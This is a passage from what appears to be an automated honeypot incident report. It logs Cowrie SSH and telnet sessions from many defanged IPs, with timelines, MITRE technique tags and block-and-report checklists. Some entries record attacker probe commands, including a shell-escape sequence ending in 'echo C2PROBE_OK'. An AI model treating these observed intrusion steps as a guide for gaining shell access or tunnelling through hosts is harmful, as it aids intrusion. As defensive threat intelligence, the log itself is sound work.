| `2026-08-01 05:30:48` | `cowrie.client.kex` |
| `2026-08-01 05:30:52` | `cowrie.login.success` |
| `2026-08-01 05:30:54` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:30:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.39.63[.]46` to AbuseIPDB if not already reported
- [ ] Block `117.39.63[.]46` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbe98b700ecb

| Field | Detail |
|---|---|
| **Source IP** | `164.164.117[.]23` |
| **First Seen** | 2026-08-01 05:31 |
| **Last Seen** | 2026-08-01 05:31 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:31:04` | `cowrie.session.connect` |
| `2026-08-01 05:31:04` | `cowrie.client.version` |
| `2026-08-01 05:31:04` | `cowrie.client.kex` |
| `2026-08-01 05:31:07` | `cowrie.login.success` |
| `2026-08-01 05:31:08` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:31:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `164.164.117[.]23` to AbuseIPDB if not already reported
- [ ] Block `164.164.117[.]23` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbac332949f0

| Field | Detail |
|---|---|
| **Source IP** | `181.212.174[.]164` |
| **First Seen** | 2026-08-01 05:31 |
| **Last Seen** | 2026-08-01 05:31 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:31:50` | `cowrie.session.connect` |
| `2026-08-01 05:31:51` | `cowrie.client.version` |
| `2026-08-01 05:31:51` | `cowrie.client.kex` |
| `2026-08-01 05:31:52` | `cowrie.login.success` |
| `2026-08-01 05:31:53` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:31:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.212.174[.]164` to AbuseIPDB if not already reported
- [ ] Block `181.212.174[.]164` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf1be6da79f4

| Field | Detail |
|---|---|
| **Source IP** | `101.13.1[.]58` |
| **First Seen** | 2026-08-01 05:31 |
| **Last Seen** | 2026-08-01 05:32 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:31:53` | `cowrie.session.connect` |
| `2026-08-01 05:31:54` | `cowrie.client.version` |
| `2026-08-01 05:31:54` | `cowrie.client.kex` |
| `2026-08-01 05:31:56` | `cowrie.login.success` |
| `2026-08-01 05:31:56` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:32:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.13.1[.]58` to AbuseIPDB if not already reported
- [ ] Block `101.13.1[.]58` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5d4ba6ab901

| Field | Detail |
|---|---|
| **Source IP** | `49.206.201[.]253` |
| **First Seen** | 2026-08-01 05:31 |
| **Last Seen** | 2026-08-01 05:32 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:31:58` | `cowrie.session.connect` |
| `2026-08-01 05:31:58` | `cowrie.client.version` |
| `2026-08-01 05:31:58` | `cowrie.client.kex` |
| `2026-08-01 05:32:00` | `cowrie.login.success` |
| `2026-08-01 05:32:01` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:32:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.206.201[.]253` to AbuseIPDB if not already reported
- [ ] Block `49.206.201[.]253` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97cb128b522c

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]56` |
| **First Seen** | 2026-08-01 05:32 |
| **Last Seen** | 2026-08-01 05:32 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:32:06` | `cowrie.session.connect` |
| `2026-08-01 05:32:06` | `cowrie.client.version` |
| `2026-08-01 05:32:06` | `cowrie.client.kex` |
| `2026-08-01 05:32:08` | `cowrie.login.success` |
| `2026-08-01 05:32:08` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:32:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]56` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]56` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa5f2c61ef43

| Field | Detail |
|---|---|
| **Source IP** | `191.210.73[.]33` |
| **First Seen** | 2026-08-01 05:32 |
| **Last Seen** | 2026-08-01 05:32 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:32:09` | `cowrie.session.connect` |
| `2026-08-01 05:32:10` | `cowrie.client.version` |
| `2026-08-01 05:32:10` | `cowrie.client.kex` |
| `2026-08-01 05:32:12` | `cowrie.login.success` |
| `2026-08-01 05:32:12` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:32:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.210.73[.]33` to AbuseIPDB if not already reported
- [ ] Block `191.210.73[.]33` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8e9f600793e

| Field | Detail |
|---|---|
| **Source IP** | `182.53.52[.]68` |
| **First Seen** | 2026-08-01 05:32 |
| **Last Seen** | 2026-08-01 05:32 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:32:14` | `cowrie.session.connect` |
| `2026-08-01 05:32:14` | `cowrie.client.version` |
| `2026-08-01 05:32:14` | `cowrie.client.kex` |
| `2026-08-01 05:32:16` | `cowrie.login.success` |
| `2026-08-01 05:32:17` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:32:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.53.52[.]68` to AbuseIPDB if not already reported
- [ ] Block `182.53.52[.]68` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ba926a25a34

| Field | Detail |
|---|---|
| **Source IP** | `65.20.153[.]146` |
| **First Seen** | 2026-08-01 05:32 |
| **Last Seen** | 2026-08-01 05:32 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:32:18` | `cowrie.session.connect` |
| `2026-08-01 05:32:18` | `cowrie.client.version` |
| `2026-08-01 05:32:18` | `cowrie.client.kex` |
| `2026-08-01 05:32:19` | `cowrie.login.success` |
| `2026-08-01 05:32:19` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:32:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.153[.]146` to AbuseIPDB if not already reported
- [ ] Block `65.20.153[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7938f6be0756

| Field | Detail |
|---|---|
| **Source IP** | `124.239.129[.]2` |
| **First Seen** | 2026-08-01 05:33 |
| **Last Seen** | 2026-08-01 05:33 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:33:01` | `cowrie.session.connect` |
| `2026-08-01 05:33:01` | `cowrie.client.version` |
| `2026-08-01 05:33:01` | `cowrie.client.kex` |
| `2026-08-01 05:33:05` | `cowrie.login.success` |
| `2026-08-01 05:33:06` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:33:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.239.129[.]2` to AbuseIPDB if not already reported
- [ ] Block `124.239.129[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae15820d8c92

| Field | Detail |
|---|---|
| **Source IP** | `46.201.247[.]21` |
| **First Seen** | 2026-08-01 05:34 |
| **Last Seen** | 2026-08-01 05:34 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:34:20` | `cowrie.session.connect` |
| `2026-08-01 05:34:20` | `cowrie.client.version` |
| `2026-08-01 05:34:20` | `cowrie.client.kex` |
| `2026-08-01 05:34:21` | `cowrie.login.success` |
| `2026-08-01 05:34:21` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:34:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.201.247[.]21` to AbuseIPDB if not already reported
- [ ] Block `46.201.247[.]21` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10a9b8862b40

| Field | Detail |
|---|---|
| **Source IP** | `146.158.118[.]252` |
| **First Seen** | 2026-08-01 05:34 |
| **Last Seen** | 2026-08-01 05:34 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:34:26` | `cowrie.session.connect` |
| `2026-08-01 05:34:26` | `cowrie.client.version` |
| `2026-08-01 05:34:26` | `cowrie.client.kex` |
| `2026-08-01 05:34:28` | `cowrie.login.success` |
| `2026-08-01 05:34:28` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:34:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `146.158.118[.]252` to AbuseIPDB if not already reported
- [ ] Block `146.158.118[.]252` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b03a9c78ac90

| Field | Detail |
|---|---|
| **Source IP** | `51.52.210[.]77` |
| **First Seen** | 2026-08-01 05:34 |
| **Last Seen** | 2026-08-01 05:34 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:34:30` | `cowrie.session.connect` |
| `2026-08-01 05:34:30` | `cowrie.client.version` |
| `2026-08-01 05:34:30` | `cowrie.client.kex` |
| `2026-08-01 05:34:31` | `cowrie.login.success` |
| `2026-08-01 05:34:32` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:34:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.52.210[.]77` to AbuseIPDB if not already reported
- [ ] Block `51.52.210[.]77` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55a893c0bedb

| Field | Detail |
|---|---|
| **Source IP** | `92.84.21[.]186` |
| **First Seen** | 2026-08-01 05:34 |
| **Last Seen** | 2026-08-01 05:34 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:34:39` | `cowrie.session.connect` |
| `2026-08-01 05:34:39` | `cowrie.client.version` |
| `2026-08-01 05:34:39` | `cowrie.client.kex` |
| `2026-08-01 05:34:40` | `cowrie.login.success` |
| `2026-08-01 05:34:40` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:34:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.84.21[.]186` to AbuseIPDB if not already reported
- [ ] Block `92.84.21[.]186` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da1fb4ebd2fa

| Field | Detail |
|---|---|
| **Source IP** | `138.219.13[.]21` |
| **First Seen** | 2026-08-01 05:34 |
| **Last Seen** | 2026-08-01 05:34 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:34:41` | `cowrie.session.connect` |
| `2026-08-01 05:34:41` | `cowrie.client.version` |
| `2026-08-01 05:34:41` | `cowrie.client.kex` |
| `2026-08-01 05:34:43` | `cowrie.login.success` |
| `2026-08-01 05:34:43` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:34:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.219.13[.]21` to AbuseIPDB if not already reported
- [ ] Block `138.219.13[.]21` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c89ce956df35

| Field | Detail |
|---|---|
| **Source IP** | `190.188.60[.]235` |
| **First Seen** | 2026-08-01 05:35 |
| **Last Seen** | 2026-08-01 05:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `enable, system, shell, sh, echo C2PROBE_OK` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:35:15` | `cowrie.session.connect` |
| `2026-08-01 05:35:15` | `cowrie.telnet.option` |
| `2026-08-01 05:35:15` | `cowrie.login.success` |
| `2026-08-01 05:35:16` | `cowrie.session.params` |
| `2026-08-01 05:35:16` | `cowrie.telnet.option` |
| `2026-08-01 05:35:16` | `cowrie.telnet.option` |
| `2026-08-01 05:35:16` | `cowrie.command.input` |
| `2026-08-01 05:35:16` | `cowrie.command.failed` |
| `2026-08-01 05:35:16` | `cowrie.command.input` |
| `2026-08-01 05:35:16` | `cowrie.command.failed` |
| `2026-08-01 05:35:16` | `cowrie.command.input` |
| `2026-08-01 05:35:16` | `cowrie.command.failed` |
| `2026-08-01 05:35:16` | `cowrie.command.input` |
| `2026-08-01 05:35:17` | `cowrie.command.input` |
| `2026-08-01 05:35:17` | `cowrie.command.input` |
| `2026-08-01 05:35:17` | `cowrie.command.input` |
| `2026-08-01 05:35:17` | `cowrie.log.closed` |
| `2026-08-01 05:35:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.188.60[.]235` to AbuseIPDB if not already reported
- [ ] Block `190.188.60[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77892fa248d7

| Field | Detail |
|---|---|
| **Source IP** | `122.176.21[.]104` |
| **First Seen** | 2026-08-01 05:35 |
| **Last Seen** | 2026-08-01 05:35 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:35:32` | `cowrie.session.connect` |
| `2026-08-01 05:35:32` | `cowrie.client.version` |
| `2026-08-01 05:35:32` | `cowrie.client.kex` |
| `2026-08-01 05:35:34` | `cowrie.login.success` |
| `2026-08-01 05:35:34` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:35:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.176.21[.]104` to AbuseIPDB if not already reported
- [ ] Block `122.176.21[.]104` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc3d5ee349ed

| Field | Detail |
|---|---|
| **Source IP** | `35.195.51[.]126` |
| **First Seen** | 2026-08-01 05:35 |
| **Last Seen** | 2026-08-01 05:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:35:56` | `cowrie.session.connect` |
| `2026-08-01 05:35:56` | `cowrie.login.success` |
| `2026-08-01 05:35:57` | `cowrie.session.params` |
| `2026-08-01 05:35:57` | `cowrie.command.input` |
| `2026-08-01 05:35:57` | `cowrie.command.input` |
| `2026-08-01 05:35:57` | `cowrie.command.failed` |
| `2026-08-01 05:35:57` | `cowrie.command.input` |
| `2026-08-01 05:35:57` | `cowrie.log.closed` |
| `2026-08-01 05:35:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.195.51[.]126` to AbuseIPDB if not already reported
- [ ] Block `35.195.51[.]126` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23a052c1f468

| Field | Detail |
|---|---|
| **Source IP** | `35.195.51[.]126` |
| **First Seen** | 2026-08-01 05:36 |
| **Last Seen** | 2026-08-01 05:36 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:36:05` | `cowrie.session.connect` |
| `2026-08-01 05:36:05` | `cowrie.login.success` |
| `2026-08-01 05:36:05` | `cowrie.session.params` |
| `2026-08-01 05:36:05` | `cowrie.command.input` |
| `2026-08-01 05:36:05` | `cowrie.command.failed` |
| `2026-08-01 05:36:11` | `cowrie.log.closed` |
| `2026-08-01 05:36:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.195.51[.]126` to AbuseIPDB if not already reported
- [ ] Block `35.195.51[.]126` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd9372c75796

| Field | Detail |
|---|---|
| **Source IP** | `35.195.51[.]126` |
| **First Seen** | 2026-08-01 05:36 |
| **Last Seen** | 2026-08-01 05:36 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:36:07` | `cowrie.session.connect` |
| `2026-08-01 05:36:07` | `cowrie.login.success` |
| `2026-08-01 05:36:07` | `cowrie.session.params` |
| `2026-08-01 05:36:07` | `cowrie.command.input` |
| `2026-08-01 05:36:11` | `cowrie.log.closed` |
| `2026-08-01 05:36:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.195.51[.]126` to AbuseIPDB if not already reported
- [ ] Block `35.195.51[.]126` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99f1c4418842

| Field | Detail |
|---|---|
| **Source IP** | `177.174.89[.]99` |
| **First Seen** | 2026-08-01 05:37 |
| **Last Seen** | 2026-08-01 05:37 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:37:31` | `cowrie.session.connect` |
| `2026-08-01 05:37:31` | `cowrie.client.version` |
| `2026-08-01 05:37:31` | `cowrie.client.kex` |
| `2026-08-01 05:37:33` | `cowrie.login.success` |
| `2026-08-01 05:37:33` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:37:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.174.89[.]99` to AbuseIPDB if not already reported
- [ ] Block `177.174.89[.]99` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29734fb7512e

| Field | Detail |
|---|---|
| **Source IP** | `213.32.20[.]78` |
| **First Seen** | 2026-08-01 05:37 |
| **Last Seen** | 2026-08-01 05:37 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:37:38` | `cowrie.session.connect` |
| `2026-08-01 05:37:38` | `cowrie.client.version` |
| `2026-08-01 05:37:38` | `cowrie.client.kex` |
| `2026-08-01 05:37:39` | `cowrie.login.success` |
| `2026-08-01 05:37:39` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:37:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.32.20[.]78` to AbuseIPDB if not already reported
- [ ] Block `213.32.20[.]78` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff22f185b3fa

| Field | Detail |
|---|---|
| **Source IP** | `208.96.233[.]67` |
| **First Seen** | 2026-08-01 05:37 |
| **Last Seen** | 2026-08-01 05:37 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:37:51` | `cowrie.session.connect` |
| `2026-08-01 05:37:52` | `cowrie.client.version` |
| `2026-08-01 05:37:52` | `cowrie.client.kex` |
| `2026-08-01 05:37:52` | `cowrie.login.success` |
| `2026-08-01 05:37:52` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:37:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `208.96.233[.]67` to AbuseIPDB if not already reported
- [ ] Block `208.96.233[.]67` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ed484fbbe03

| Field | Detail |
|---|---|
| **Source IP** | `90.228.229[.]182` |
| **First Seen** | 2026-08-01 05:38 |
| **Last Seen** | 2026-08-01 05:38 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:38:09` | `cowrie.session.connect` |
| `2026-08-01 05:38:09` | `cowrie.client.version` |
| `2026-08-01 05:38:09` | `cowrie.client.kex` |
| `2026-08-01 05:38:10` | `cowrie.login.success` |
| `2026-08-01 05:38:10` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:38:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `90.228.229[.]182` to AbuseIPDB if not already reported
- [ ] Block `90.228.229[.]182` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c8a79d79fc2

| Field | Detail |
|---|---|
| **Source IP** | `207.219.221[.]101` |
| **First Seen** | 2026-08-01 05:38 |
| **Last Seen** | 2026-08-01 05:38 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:38:15` | `cowrie.session.connect` |
| `2026-08-01 05:38:15` | `cowrie.client.version` |
| `2026-08-01 05:38:15` | `cowrie.client.kex` |
| `2026-08-01 05:38:16` | `cowrie.login.success` |
| `2026-08-01 05:38:16` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:38:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.219.221[.]101` to AbuseIPDB if not already reported
- [ ] Block `207.219.221[.]101` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b1826904e68

| Field | Detail |
|---|---|
| **Source IP** | `190.188.60[.]235` |
| **First Seen** | 2026-08-01 05:38 |
| **Last Seen** | 2026-08-01 05:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `enable, system, shell, sh, echo C2PROBE_OK` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:38:33` | `cowrie.session.connect` |
| `2026-08-01 05:38:34` | `cowrie.telnet.option` |
| `2026-08-01 05:38:34` | `cowrie.login.success` |
